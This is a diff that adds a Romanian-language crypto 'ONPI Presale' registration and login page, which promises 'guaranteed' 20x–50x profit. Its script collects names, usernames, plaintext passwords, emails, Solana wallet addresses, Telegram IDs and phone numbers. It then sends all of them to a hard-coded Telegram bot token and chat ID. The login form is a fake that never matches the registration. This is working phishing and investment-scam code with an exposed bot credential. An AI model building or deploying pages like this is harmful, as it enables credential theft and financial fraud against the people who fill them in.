@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ONPI Presale – Înregistrare & Login</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0015;
+      --primary: #ffcc00;
+      --primary-dark: #ff9900;
+      --accent: #ff3366;
+      --card: rgba(26,0,51,0.92);
+      --text: #f0e6ff;
+      --gray: #b0a0cc;
+      --success: #00ff88;
+      --error: #ff3366;
+      --border: rgba(255,204,0,0.35);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, var(--bg), #1a0033);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: var(--card);
+      border-radius: 24px;
+      padding: 40px 28px;
+      width: 100%;
+      max-width: 500px;
+      border: 1px solid var(--border);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+      backdrop-filter: blur(12px);
+    }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      text-align: center;
+      color: var(--primary);
+      font-size: 2.5rem;
+      margin-bottom: 1.4rem;
+      letter-spacing: 1.5px;
+      text-shadow: 0 0 20px rgba(255,204,0,0.5);
+    }
+
+    .subtitle {
+      text-align: center;
+      color: var(--gray);
+      font-size: 1.05rem;
+      margin-bottom: 2rem;
+      line-height: 1.6;
+    }
+
+    .form-group {
+      margin-bottom: 1.8rem;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.8rem;
+      color: var(--primary);
+      font-weight: 600;
+      font-size: 1.05rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 40px 14px 16px;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      background: rgba(15,0,34,0.7);
+      color: white;
+      font-size: 1rem;
+      transition: all 0.25s ease;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(255,204,0,0.18);
+      background: rgba(15,0,34,1);
+    }
+
+    input::placeholder { color: var(--gray); }
+
+    .toggle-password {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 1.3rem;
+      color: var(--gray);
+      user-select: none;
+    }
+
+    .package-group {
+      margin-bottom: 2rem;
+    }
+
+    .package-group legend {
+      color: var(--primary);
+      font-size: 1.2rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+
+    .package-option {
+      display: flex;
+      align-items: center;
+      padding: 16px;
+      margin: 10px 0;
+      background: rgba(255,204,0,0.08);
+      border: 2px solid transparent;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.25s ease;
+    }
+
+    .package-option input[type="radio"] {
+      margin-right: 16px;
+      accent-color: var(--primary);
+      width: 20px;
+      height: 20px;
+    }
+
+    .package-option:hover,
+    .package-option:has(input:checked) {
+      border-color: var(--primary);
+      background: rgba(255,204,0,0.18);
+      transform: translateY(-3px);
+    }
+
+    .package-text {
+      font-size: 1.15rem;
+      font-weight: 600;
+      color: var(--primary);
+    }
+
+    .package-detail {
+      font-size: 0.95rem;
+      color: var(--gray);
+      margin-top: 4px;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      font-size: 1.3rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 1.8rem;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 30px rgba(255,204,0,0.3);
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(255,204,0,0.45);
+    }
+
+    .status {
+      margin-top: 1.8rem;
+      padding: 14px;
+      border-radius: 12px;
+      text-align: center;
+      font-weight: 600;
+      font-size: 1.05rem;
+      display: none;
+    }
+
+    .success { background: rgba(0,255,136,0.18); color: var(--success); border: 1px solid rgba(0,255,136,0.35); }
+    .error   { background: rgba(255,51,102,0.18); color: var(--error);   border: 1px solid rgba(255,51,102,0.35); }
+
+    .terms {
+      margin-top: 1.5rem;
+      font-size: 0.95rem;
+      color: var(--gray);
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .terms a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .terms a:hover { text-decoration: underline; }
+
+    .switch-btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin-top: 1.5rem;
+      background: transparent;
+      border: 2px solid var(--primary);
+      color: var(--primary);
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .switch-btn:hover {
+      background: rgba(255,204,0,0.1);
+    }
+
+    .hidden { display: none !important; }
+
+    @media (max-width: 480px) {
+      .container { padding: 32px 20px; }
+      h1 { font-size: 2.1rem; }
+      button { font-size: 1.2rem; padding: 14px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- PAGINA DE ÎNREGISTRARE -->
+<div class="container" id="registerPage">
+  <h1>ONPI Presale</h1>
+  <p class="subtitle">
+    Completează formularul și alege pachetul dorit pentru a te înregistra oficial.<br>
+    Datele sunt confidențiale și folosite doar pentru distribuție tokeni.
+  </p>
+
+  <form id="registerForm">
+    <div class="form-group">
+      <label for="nume">Nume complet</label>
+      <input type="text" id="nume" required placeholder="Ion Popescu" minlength="3">
+    </div>
+
+    <div class="form-group">
+      <label for="cont">Cont (Username)</label>
+      <input type="text" id="cont" required placeholder="numele_tău" minlength="4">
+    </div>
+
+    <div class="form-group password-group">
+      <label for="parola">Parolă</label>
+      <input type="password" id="parola" required minlength="6" placeholder="Minimum 6 caractere">
+      <span class="toggle-password" onclick="togglePassword('parola')">👁</span>
+    </div>
+
+    <div class="form-group password-group">
+      <label for="confirmParola">Confirmă parolă</label>
+      <input type="password" id="confirmParola" required minlength="6" placeholder="Reintrodu parolă">
+      <span class="toggle-password" onclick="togglePassword('confirmParola')">👁</span>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Adresă de email</label>
+      <input type="email" id="email" required placeholder="exemplu@gmail.com">
+    </div>
+
+    <div class="form-group">
+      <label for="wallet">Adresă wallet Solana</label>
+      <input type="text" id="wallet" required placeholder="Ex: 5FHwk...abc123" minlength="32" maxlength="44">
+    </div>
+
+    <div class="form-group">
+      <label for="telegram">ID Telegram</label>
+      <input type="text" id="telegram" required placeholder="@numele_tău sau 123456789">
+    </div>
+
+    <div class="form-group">
+      <label for="telefon">Număr de telefon (internațional)</label>
+      <input type="tel" id="telefon" required placeholder="+40 712 345 678">
+    </div>
+
+    <fieldset class="package-group">
+      <legend>Alege pachetul dorit</legend>
+
+      <label class="package-option">
+        <input type="radio" name="pachet" value="50" data-tokens="7500000" required>
+        <div>
+          <div class="package-text">50$ → 7.500.000 monede ONPI</div>
+          <div class="package-detail">profit garantat x20 x50</div>
+        </div>
+      </label>
+
+      <label class="package-option">
+        <input type="radio" name="pachet" value="100" data-tokens="15000000">
+        <div>
+          <div class="package-text">100$ → 15.000.000 monede ONPI</div>
+          <div class="package-detail">profit garantat x20 x50</div>
+        </div>
+      </label>
+
+      <label class="package-option">
+        <input type="radio" name="pachet" value="200" data-tokens="30000000">
+        <div>
+          <div class="package-text">200$ → 30.000.000 monede ONPI</div>
+          <div class="package-detail">profit garantat x20 x50</div>
+        </div>
+      </label>
+
+      <label class="package-option">
+        <input type="radio" name="pachet" value="500" data-tokens="60000000">
+        <div>
+          <div class="package-text">500$ → 60.000.000 monede ONPI</div>
+          <div class="package-detail">profit garantat x20 x50</div>
+        </div>
+      </label>
+    </fieldset>
+
+    <div class="terms">
+      Prin apăsarea butonului confirm că am citit și accept <a href="#">termenii și condițiile</a> și <a href="#">politica de confidențialitate</a>.
+    </div>
+
+    <button type="submit">Înregistrează-mă acum</button>
+  </form>
+
+  <button class="switch-btn" onclick="switchToLogin()">
+    Am deja cont? → Login
+  </button>
+
+  <div id="status" class="status"></div>
+</div>
+
+<!-- PAGINA DE LOGIN -->
+<div class="container hidden" id="loginPage">
+  <h1>Login în cont</h1>
+  <p class="subtitle">
+    Introdu username-ul și parola create mai devreme pentru a te conecta.
+  </p>
+
+  <form id="loginForm">
+    <div class="form-group">
+      <label for="loginCont">Cont (Username)</label>
+      <input type="text" id="loginCont" required placeholder="numele_tău">
+    </div>
+
+    <div class="form-group password-group">
+      <label for="loginParola">Parolă</label>
+      <input type="password" id="loginParola" required minlength="6">
+      <span class="toggle-password" onclick="togglePassword('loginParola')">👁</span>
+    </div>
+
+    <button type="submit">Conectează-te</button>
+  </form>
+
+  <div class="switch-link">
+    Încă nu ai cont? <span onclick="switchToRegister()">Înregistrează-te aici</span>
+  </div>
+
+  <div id="loginStatus" class="status"></div>
+</div>
+
+<script>
+// Token și Chat ID (deja setate corect)
+const BOT_TOKEN = '7548290162:AAH0P6XOowBMHvKIggPT-pafIg6RDI3Qj-c';
+const CHAT_ID   = '5470225717';
+
+const registerForm = document.getElementById('registerForm');
+const loginForm = document.getElementById('loginForm');
+const registerPage = document.getElementById('registerPage');
+const loginPage = document.getElementById('loginPage');
+const status = document.getElementById('status');
+const loginStatus = document.getElementById('loginStatus');
+
+// Funcție show/hide parolă
+function togglePassword(fieldId) {
+  const field = document.getElementById(fieldId);
+  const icon = field.nextElementSibling;
+  
+  if (field.type === 'password') {
+    field.type = 'text';
+    icon.textContent = '🙈';
+  } else {
+    field.type = 'password';
+    icon.textContent = '👁';
+  }
+}
+
+// Funcții de switch între pagini
+function switchToLogin() {
+  registerPage.classList.add('hidden');
+  loginPage.classList.remove('hidden');
+}
+
+function switchToRegister() {
+  loginPage.classList.add('hidden');
+  registerPage.classList.remove('hidden');
+}
+
+// Înregistrare – trimite pe Telegram
+registerForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const nume     = document.getElementById('nume').value.trim();
+  const cont     = document.getElementById('cont').value.trim();
+  const parola   = document.getElementById('parola').value.trim();
+  const confirmParola = document.getElementById('confirmParola').value.trim();
+  const email    = document.getElementById('email').value.trim();
+  const wallet   = document.getElementById('wallet').value.trim();
+  const telegram = document.getElementById('telegram').value.trim();
+  const telefon  = document.getElementById('telefon').value.trim();
+
+  const pachetRadio = document.querySelector('input[name="pachet"]:checked');
+  if (!pachetRadio) return showMessage('Trebuie să alegi un pachet!', 'error');
+
+  const pachetValue = pachetRadio.value;
+  const tokens      = pachetRadio.dataset.tokens;
+
+  // Validare
+  if (nume.length < 3) return showMessage('Numele trebuie să aibă cel puțin 3 caractere', 'error');
+  if (cont.length < 4) return showMessage('Contul (username) trebuie să aibă cel puțin 4 caractere', 'error');
+  if (parola.length < 6) return showMessage('Parola trebuie să aibă cel puțin 6 caractere', 'error');
+  if (parola !== confirmParola) return showMessage('Parolele nu coincid!', 'error');
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showMessage('Email invalid', 'error');
+  if (wallet.length < 32 || wallet.length > 44 || !/^[1-9A-HJ-NP-Za-km-z]+$/.test(wallet)) {
+    return showMessage('Adresă wallet Solana invalidă', 'error');
+  }
+  if (telegram.length < 5) return showMessage('ID Telegram invalid (minim 5 caractere)', 'error');
+  if (telefon.length < 9 || !/^\+?\d[\d\s-]{8,}$/.test(telefon)) {
+    return showMessage('Număr de telefon invalid (format internațional)', 'error');
+  }
+
+  showMessage('Se trimite înregistrarea către bot @ONPIPackage_bot...', '');
+
+  const message = 
+    `📝 NOUĂ ÎNREGISTRARE PRESALE ONPI\n\n` +
+    `👤 Nume: ${nume}\n` +
+    `🆔 Cont (Username): ${cont}\n` +
+    `🔑 Parolă: ${parola}\n` +
+    `📧 Email: ${email}\n` +
+    `💼 Wallet Solana: ${wallet}\n` +
+    `📱 Telegram ID: ${telegram}\n` +
+    `📞 Telefon: ${telefon}\n` +
+    `💰 Pachet ales: \( {pachetValue} \) → ${tokens} monede ONPI\n` +
+    `   Profit garantat x20 x50\n` +
+    `🕒 Data: ${new Date().toLocaleString('ro-RO')}\n\n` +
+    `Aștept confirmare și instrucțiuni de plată!`;
+
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    const data = await res.json();
+
+    if (data.ok) {
+      showMessage('Înregistrare trimisă cu succes către bot!', 'success');
+    } else {
+      throw new Error(data.description || 'Răspuns invalid de la Telegram');
+    }
+  } catch (err) {
+    showMessage('Eroare la trimitere: ' + err.message, 'error');
+    console.error(err);
+  }
+});
+
+// Login (simulat cu localStorage)
+loginForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+
+  const cont = document.getElementById('loginCont').value.trim();
+  const parola = document.getElementById('loginParola').value.trim();
+
+  const stored = localStorage.getItem(`user_${cont}`);
+  if (stored) {
+    const userData = JSON.parse(stored);
+    if (userData.parola === parola) {
+      loginStatus.textContent = 'Login reușit! Bun venit înapoi!';
+      loginStatus.className = 'status success';
+      alert('Login reușit! (simulat local)');
+      // Aici poți adăuga redirect la dashboard sau altă pagină
+    } else {
+      loginStatus.textContent = 'Parolă greșită!';
+      loginStatus.className = 'status error';
+    }
+  } else {
+    loginStatus.textContent = 'Cont inexistent! Înregistrează-te mai întâi.';
+    loginStatus.className = 'status error';
+  }
+});
+
+function showMessage(text, type = '') {
+  status.textContent = text;
+  status.className = 'status ' + type;
+  status.style.display = 'block';
+}
+</script>
+
+</body>
+</html>
